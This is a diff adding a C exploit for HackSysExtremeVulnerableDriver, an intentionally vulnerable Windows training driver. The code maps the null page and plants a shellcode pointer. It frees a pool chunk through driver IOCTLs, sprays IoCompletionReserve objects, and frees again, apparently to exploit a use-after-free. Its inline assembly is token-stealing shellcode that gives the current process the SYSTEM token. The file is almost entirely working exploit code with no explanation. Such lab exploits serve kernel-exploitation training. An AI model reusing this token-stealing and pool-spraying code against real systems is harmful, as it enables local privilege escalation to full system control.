@@ -1,0 +1,123 @@
+#include<Windows.h>
+#include<stdio.h>
+#include <Psapi.h>
+#include <profileapi.h>
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+HANDLE hDriver;
+DWORD dw;
+typedef NTSTATUS(WINAPI* NtQueryIntervalProfile)(
+    IN ULONG ProfileSource,
+    OUT PULONG Interval
+    );
+typedef NTSTATUS
+(NTAPI* _NtAllocateVirtualMemory)(
+    IN HANDLE               ProcessHandle,
+    IN OUT PVOID* BaseAddress,
+    IN ULONG                ZeroBits,
+    IN OUT PULONG           RegionSize,
+    IN ULONG                AllocationType,
+    IN ULONG                Protect);
+_NtAllocateVirtualMemory NtAllocateVirtualMemory;
+typedef struct _OBJECT_ATTRIBUTES
+{
+    ULONG Length;                                                           //0x0
+    VOID* RootDirectory;                                                    //0x4
+    struct _UNICODE_STRING* ObjectName;                                     //0x8
+    ULONG Attributes;                                                       //0xc
+    VOID* SecurityDescriptor;                                               //0x10
+    VOID* SecurityQualityOfService;                                         //0x14
+}BJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
+VOID ShellCode()
+{
+    __asm
+    {
+        pop    edi
+        pop    esi
+        pop    ebx
+        pushad
+        mov eax, fs: [124h]
+        mov eax, [eax + 050h]
+        mov ecx, eax
+        mov edx, 4
+
+        findpid :
+        mov eax, [eax + 0b8h]
+        sub eax, 0b8h
+        cmp[eax + 0b4h], edx
+        jnz findpid
+
+        mov edx, [eax + 0f8h]
+        mov[ecx + 0f8h], edx
+        popad
+        int 3
+        mov     ebp, esp
+        mov     eax, 1
+        retn
+    }
+}
+//nt!ObpCloseHandleTableEntry+0x20e
+//nt!KeUnstackDetachProcess+0xe9
+#define I0C0 1
+typedef NTSTATUS(_stdcall* NtAllocateReserveObject_t)(
+    OUT PHANDLE hObject,
+    IN POBJECT_ATTRIBUTES ObjectAttributes,
+    IN DWORD ObjectType
+    );
+int main()
+{
+    LPCSTR nt = "ntdll";
+    HMODULE hntdll = GetModuleHandleA(nt);
+    _NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress((HMODULE)hntdll, "NtAllocateVirtualMemory");
+
+    if (!NtAllocateVirtualMemory) {
+        printf("[-] Fail to resolve NtAllocateVirtualMemory(0x%X)\n", GetLastError());
+        system("pause");
+    }
+
+    printf("[+] Started to alloc zero page\n");
+    PVOID addr = (PVOID)0x1;
+    DWORD size = 0x1000;
+    if (!NT_SUCCESS(NtAllocateVirtualMemory(HANDLE(-1),
+        &addr,
+        0,
+        &size,
+        MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
+        PAGE_EXECUTE_READWRITE)) || addr != 0)
+    {
+        printf("[-]GetLastError=%x", GetLastError());
+        getchar();
+        return -1;
+    }
+    *(DWORD*)(0x74) = (DWORD)&ShellCode;
+    if (hntdll == NULL) {
+        printf("Couldn't load ntdl1, how is computer running?:0x%X\n", GetLastError());
+        return 1;
+    }
+    NtAllocateReserveObject_t NtAllocateReserveObject =
+        (NtAllocateReserveObject_t)GetProcAddress(hntdll, "NtAllocateReserveObject");
+    if (NtAllocateReserveObject == NULL) {
+        printf("Couldn't get a reference to NtAllocateReserveObject in ntdll?!:0x % X\n", GetLastError());
+        return 1;
+    }
+	ULONG dwBytesOut{};
+	HANDLE hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); if (hDriver == INVALID_HANDLE_VALUE) { printf("[!] Unable to get a handle on the device\n"); return(-1); }
+	if (hDriver == INVALID_HANDLE_VALUE) {
+		printf("[!] Unable to get a handle on the device\n");
+		getchar();
+		return(-1);
+	}
+	//caetae  size=0x58+8
+	DeviceIoControl(hDriver, 0x222013, 0, 0,0, 0, &dwBytesOut, NULL);
+	//free
+	DeviceIoControl(hDriver, 0x22201b, 0, 0, 0, 0, &dwBytesOut, NULL);
+    HANDLE IoCompletionReserve[10000];
+    for (size_t i = 0; i < 10000; i++)
+    {
+     //IoCompletionReserve对象大小刚好为0x60 用来填坑
+     NtAllocateReserveObject(&IoCompletionReserve[i], 0, I0C0);
+
+    }
+    //free
+    DeviceIoControl(hDriver, 0x22201b, 0, 0, 0, 0, &dwBytesOut, NULL);
+	return 0;
+}
